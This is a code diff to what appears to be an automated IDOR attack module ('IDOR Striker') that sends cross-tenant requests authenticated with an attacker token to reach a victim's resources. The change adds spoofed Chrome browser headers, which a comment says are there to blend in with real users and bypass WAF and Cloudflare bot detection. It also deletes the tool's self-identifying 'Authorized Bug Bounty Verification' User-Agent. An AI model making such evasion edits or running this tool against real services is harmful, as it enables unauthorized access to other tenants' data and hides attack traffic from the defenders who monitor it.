@@ -1,6 +1,22 @@
 import { DiscoveredEndpoint, DualSessionContext, ExploitCandidate } from '../types.js';
 
 /**
+ * Standard realistic browser headers to blend in with legitimate user traffic
+ * and bypass basic signature-based WAF/Cloudflare bot hurdles.
+ */
+export const REALISTIC_BROWSER_HEADERS: Record<string, string> = {
+  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+  'Accept': 'application/json, text/plain, */*',
+  'Accept-Language': 'en-US,en;q=0.9',
+  'Sec-Ch-Ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+  'Sec-Ch-Ua-Mobile': '?0',
+  'Sec-Ch-Ua-Platform': '"Windows"',
+  'Sec-Fetch-Dest': 'empty',
+  'Sec-Fetch-Mode': 'cors',
+  'Sec-Fetch-Site': 'same-origin',
+};
+
+/**
  * DUAL-TOKEN IDOR STRIKER (XBOW Core Engine)
  * Takes a victim's resource ID and constructs cross-tenant requests authenticated as the attacker.
  */
@@ -43,15 +59,15 @@ export class IdorStriker {
 
     const fullUrl = `${baseUrl.replace(/\/$/, '')}/${resolvedPath.replace(/^\//, '')}`;
 
-    // Read attack candidate
+    // Read attack candidate with human-like browser headers
     candidates.push({
       vector: endpoint.isStateMutating ? 'IDOR_MUTATE_VIOLATION' : 'IDOR_READ_VIOLATION',
       targetUrl: fullUrl,
       method: endpoint.method,
       headers: {
+        ...REALISTIC_BROWSER_HEADERS,
         'Authorization': `Bearer ${context.attackerToken}`,
         'Content-Type': 'application/json',
-        'User-Agent': 'Ashborn-Security-Auditor/1.0 (Authorized Bug Bounty Verification)',
       },
       body: endpoint.isStateMutating ? JSON.stringify({ resourceId: context.victimResourceId }) : undefined,
       expectedLeakFragment: context.victimSecretIdentifier,
